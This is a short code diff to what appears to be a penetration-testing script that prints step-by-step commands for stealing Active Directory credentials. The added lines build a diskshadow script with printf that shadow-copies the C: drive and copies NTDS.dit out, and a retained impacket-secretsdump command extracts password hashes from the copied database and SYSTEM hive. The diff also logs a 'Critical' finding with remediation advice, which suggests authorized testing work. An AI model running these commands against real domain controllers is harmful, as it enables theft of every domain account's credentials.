@@ -52,7 +52,10 @@ def run():
 
   {Y}Parse:{RST}
   impacket-secretsdump -ntds ntds_bak.dit -system system_bak.hiv LOCAL
+  {Y}CRLF WARNING - generate script on Kali with correct line endings:{RST}
+  printf "set context persistent nowriters\\r\\nadd volume c: alias ntds\\r\\ncreate\\r\\nexpose %%ntds%% z:\\r\\nexec \"cmd.exe\" \"/c copy z:\\\\Windows\\\\NTDS\\\\NTDS.dit C:\\\\Windows\\\\Temp\\\\ntds_bak.dit\"\\r\\ndelete shadows volume %%ntds%%\\r\\nreset\\r\\n" > /tmp/shadow.txt
 """)
+        info("CRLF WARNING: Diskshadow scripts MUST have CRLF line endings - use printf with \\r\\n on Kali")
         add_finding("NTDS.dit via diskshadow", "Critical",
                     "NTDS.dit extracted via VSS shadow copy",
                     "Restrict diskshadow; monitor VSS events; rotate all credentials")
